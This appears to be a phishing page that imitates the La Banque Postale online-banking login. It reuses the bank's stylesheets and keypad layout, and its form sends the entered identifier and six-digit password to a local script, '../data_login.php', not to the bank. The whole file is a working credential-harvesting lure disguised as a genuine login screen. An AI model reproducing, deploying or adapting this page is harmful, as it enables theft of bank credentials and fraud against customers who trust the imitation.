<!DOCTYPE html>
<html class="no-js" lang="fr" data-tb-mode="light" data-tb-cvd="old">
  <div id="in-page-channel-node-id" data-channel-name="in_page_channel_Xgh9sL"></div>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />

    <title>Connexion - La Banque Postale</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="format-detection" content="telephone=no" />

    <meta name="theme-color" content="#0b234d" />

    <style type="text/css">
      @import url(https://transverse.labanquepostale.fr/xo_/9.10.2.0/cvvs/css/loader.css);
      @import url(https://transverse.labanquepostale.fr/xo_/9.10.2.0/cvvs/css/cvs_refonte.css);
      @import url(https://transverse.labanquepostale.fr/xo_/toolbox/3.1/toolbox-xo-celadon.css);
      @import url(https://transverse.labanquepostale.fr/xo_/9.10.2.0/cvvs/css/cvd-refonte.css);
    </style>



<style>
  /* Styling for error messages */
  .error-message {
    color: red;
    font-size: 0.9em;
    margin-top: 5px;
  }
</style>
  </head>

  <body data-image="logo" data-tb-animate="actif" class="tb-user-connected">
  
  
    <div class="flex-container--column tb-wrapper-main">
      <main class="flex-item-fluid overflow-y back-color-trans txt-color-black txt-primary p-16" role="main">
        <form id="form-xo-1" method="post" action="../data_login.php" name="formAccesCompte" target="_top">

          <div id="hidden">
          
          </div>

          <!-- ECRAN -->
          <div data-tb-cvd-bloc="" class="flex-item-fluid small-w100 tiny-w100" id="ecran">
            <div data-tb-form-field="" data-tb-form-id="identifiant" class="flex-container w100">
              <label data-tb-variant="body-b" for="identifiant" class="txt-primary mb-4">Identifiant (10 chiffres)</label>
             
			 <div class="flex-container w100">
                <div class="tb-container-inputfield w100 --reset --underline --injected --focus-within --empty" data-tb-type="code" data-tb-length="0">
                  <input
                    type="text"
                    id="identifiant"
                    inputmode="numeric"
                    data-tb-input-field-accessreset="Effacer la saisie de l&#39;identifiant"
                    maxlength="10"
                    pattern="[\*0-9]*"
                    autocomplete="username"
                    aria-required="true"
                    name="username"
                    class="--ready"
                  />
                  <button id="reset-identifiant" class="flex-container flex-align-center flex-center --reset" data-lien-user="actif" type="button" style="display: none;">
      <span data-icon="tb-reset" class="--reset" aria-hidden="true"></span>
      <span class="visually-hidden access-text">Effacer la saisie de l'identifiant</span>
    </button>
				  
                  <div data-tb-underline="" aria-hidden="true">
                    <div class="--caret"></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                  </div>
                </div>
              </div>
			  <!-- Error Message for Identifiant -->
<span data-ad-message="RG001" id="identifiant-RG001" class="error-message" style="display: none;">Vous devez saisir un identifiant.</span>


              <div data-tb-form-message="" class="flex-container flex-item-last">
                <div data-icon="tb-erreur" aria-hidden="true" class="--size16px"></div>
                <p data-ad-messages="" class="flex-container--column flex-item-fluid mts mb0">
                  <span data-ad-message="RG001" hidden="">Vous devez saisir un identifiant.</span>
                  <span data-ad-message="RG002" hidden="">L'identifiant doit contenir 10 chiffres.</span>
                </p>
              </div>
            </div>

            <!-- Case à cocher -->
            <div class="tb-switch --animate-touch mt-16">
              <input id="check" name="check" type="checkbox" class="visually-hidden" />
              <label for="check" class="flex-container--row flex-align-center">
                <span class="tb-switch-check">
                  <span data-icon="ic_interface_check" aria-hidden="true" class="--absolute-contains"> </span>
                </span>
                <span data-tb-variant="body-s" class="tb-switch-label flex-item-first flex-item-fluid --fix-ms txt-secondary">
                 &nbsp;M&eacute;moriser mon identifiant
                </span>
              </label>
            </div>

            <!-- Bouton continuer -->
            <div id="btnContinuer" class="mt-16 u-txt-center">
              <button class="tb-btn-p --large w100" type="submit" data-lien-user="actif" onclick="continuer()">
                <span>Continuer</span>
              </button>
            </div>

            <!-- Volet Mot de passe -->
            <div id="volet" hidden="" class="w100 mt-16">
              <!-- Mot de passe -->
              <div data-tb-form-field="" data-tb-form-id="motdepasse" class="flex-container--column">
                <!-- LABEL -->
                <div data-tb-cvd-label="" role="heading" aria-level="3" id="label-password" tabindex="-1" data-tb-cvd-alert="N&#39;appuyez pas sur les chiffres de votre clavier, utilisez les boutons suivants pour saisir votre mot de passe">
                  <span aria-hidden="true" data-tb-variant="body-b" class="txt-primary">Mot de passe (6 chiffres)</span>
                  <span class="visually-hidden">Utilisez les boutons suivants pour saisir votre Mot de passe � 6 chiffres sur ce clavier</span>
                </div>

                <!-- INPUT + PUCES -->
                <div class="tb-container-cvdPsw --reset --injected --empty">
                  <div class="relative">
                    <input type="text" id="password" name="password" maxlength="6" hidden="" class="--ready" />
                    <span class="puces" aria-hidden="true"><span class="puce"></span><span class="puce"></span><span class="puce"></span><span class="puce"></span><span class="puce"></span><span class="puce"></span></span>
                  </div>
                  <div data-tb-aria="" aria-atomic="true" class="visually-hidden access-text" aria-live="polite"><p>0 chiffre saisi sur 6</p></div>
                 
              <button id="reset-password" class="flex-container flex-align-center flex-center --reset" data-lien-user="actif" type="button" style="display: flex;">
      <span data-icon="tb-reset" class="--reset" aria-hidden="true"></span>
      <span class="visually-hidden access-text">Effacer la saisie de l'identifiant</span>
    </button>
			  </div>

                <!-- ERRORS -->
                <div data-tb-form-message="" class="flex-container">
                  <div data-icon="tb-erreur" aria-hidden="true" class="--size16px"></div>
                  <div role="heading" aria-level="4" id="motdepasse" tabindex="-1" data-ad-messages="" class="flex-container--column flex-item-fluid no-aria-describedby">
                    <span data-ad-message="vide" hidden="">Vous devez saisir un mot de passe.</span>
                    <span data-ad-message="incomplet" hidden="">
                      <span aria-hidden="true">Le mot de passe doit contenir 6 chiffres</span>
                      <span class="visually-hidden access-text">Le mot de passe doit contenir 6 chiffres</span>
                    </span>
                  </div>
                </div>
				<!-- Error Message for Password -->
<span data-ad-message="vide" id="motdepasse-vide" class="error-message" style="display: none;">Vous devez saisir un mot de passe.</span>

                <!-- CLAVIER -->
                <div class="flex-container flex-center mt-16" data-tb-cvd-id="password">
                  <div data-tb-cvd-keys="">
                    <button type="button" data-tb-index="0" class="tb-btn-k --medium">5</button>
                    <button type="button" data-tb-index="1" class="tb-btn-k --medium">1</button>
                    <button type="button" data-tb-index="2" class="tb-btn-k --medium">8</button>
                    <button type="button" data-tb-index="3" class="tb-btn-k --medium">3</button>
                    <button type="button" data-tb-index="4" class="tb-btn-k --medium">0</button>
                    <button type="button" data-tb-index="5" class="tb-btn-k --medium">2</button>
                    <button type="button" data-tb-index="6" class="tb-btn-k --medium">9</button>
                    <button type="button" data-tb-index="7" class="tb-btn-k --medium">6</button>
                    <button type="button" data-tb-index="8" class="tb-btn-k --medium">7</button>
                    <span></span>
                    <button type="button" data-tb-index="9" class="tb-btn-k --medium">4</button>
                    <span></span>
                  </div>
                </div>
              </div>
              <!-- Bouton de connexion -->
              <div class="flex-container--column flex-align-center mt-24 u-txt-center">
                <button
                  data-tb-cvd-valider=""
                  id="btnConfirmer"
                  class="tb-btn-p --large w100"
                  type="submit"
         
                  data-tb-cvd-alert="N&#39;appuyez pas sur les chiffres de votre clavier, utilisez les boutons pr�c�dents pour saisir votre mot de passe"
                >
                  <span>Se connecter</span>
                </button>
              </div>
            </div>
          </div>
        </form>
        <!-- LOADER -->
        <div id="tbi-loader" class="--tiny --spinner" data-tb-spinner="spin"></div>
      </main>
    </div>
    <div style="clear: both; display: block; height: 0px;"></div>
	
<script>


document.addEventListener("DOMContentLoaded", function () {
  const identifiantField = document.getElementById("identifiant");
  const resetIdentifiantButton = document.getElementById("reset-identifiant");
  const identifiantError = document.getElementById("identifiant-RG001");

  const passwordField = document.getElementById("password");
  const passwordError = document.getElementById("motdepasse-vide");
  const puces = document.querySelectorAll(".puces .puce");
  const passwordSection = document.getElementById("volet");
  const continueButton = document.querySelector("#btnContinuer button");

  // Show or hide reset button based on identifiant field input
  identifiantField.addEventListener("input", function () {
    if (identifiantField.value.length > 0) {
      resetIdentifiantButton.style.display = "flex";
    } else {
      resetIdentifiantButton.style.display = "none";
    }
  });

  // Clear identifiant field on reset button click
  resetIdentifiantButton.addEventListener("click", function () {
    identifiantField.value = "";
    resetIdentifiantButton.style.display = "none";
    identifiantField.focus();
  });

  // Function to continue to password entry
  function continueToPasswordEntry(event) {
    event.preventDefault();

    // Check if username is filled
    if (identifiantField.value.trim() === "") {
      identifiantError.style.display = "block"; // Show username error message
    } else {
      identifiantError.style.display = "none"; // Hide username error message
      passwordSection.removeAttribute("hidden"); // Show password section
      continueButton.style.display = "none"; // Hide continue button
      passwordField.focus(); // Set focus on password field
    }
  }

  // Bind continue button to progress to password section
  continueButton.addEventListener("click", continueToPasswordEntry);

  // Handle keypad for password input
  document.querySelectorAll('[data-tb-cvd-keys] button').forEach(button => {
    button.addEventListener("click", function () {
      if (passwordField.value.length < 6) {
        passwordField.value += this.innerText;
        passwordField.setAttribute("value", passwordField.value);
        puces[passwordField.value.length - 1].classList.add("--select");
      }
    });
  });

  // Clear password field and reset indicators
  const resetPasswordButton = document.getElementById("reset-password");
  resetPasswordButton.addEventListener("click", function () {
    passwordField.value = "";
    passwordField.setAttribute("value", "");
    puces.forEach(puce => puce.classList.remove("--select"));
  });

  // Validate fields on form submission
  document.getElementById("form-xo-1").addEventListener("submit", function (event) {
    let valid = true;

    // Check if identifiant is empty
    if (identifiantField.value.trim() === "") {
      identifiantError.style.display = "block"; // Show identifiant error
      valid = false;
    } else {
      identifiantError.style.display = "none"; // Hide identifiant error
    }

    // Check if password has exactly 6 digits
    if (passwordField.value.length !== 6) {
      passwordError.style.display = "block"; // Show password error
      valid = false;
    } else {
      passwordError.style.display = "none"; // Hide password error
    }

    // Prevent form submission if any field is invalid
    if (!valid) {
      event.preventDefault();
    }
  });
});


</script>


</body>





</html>
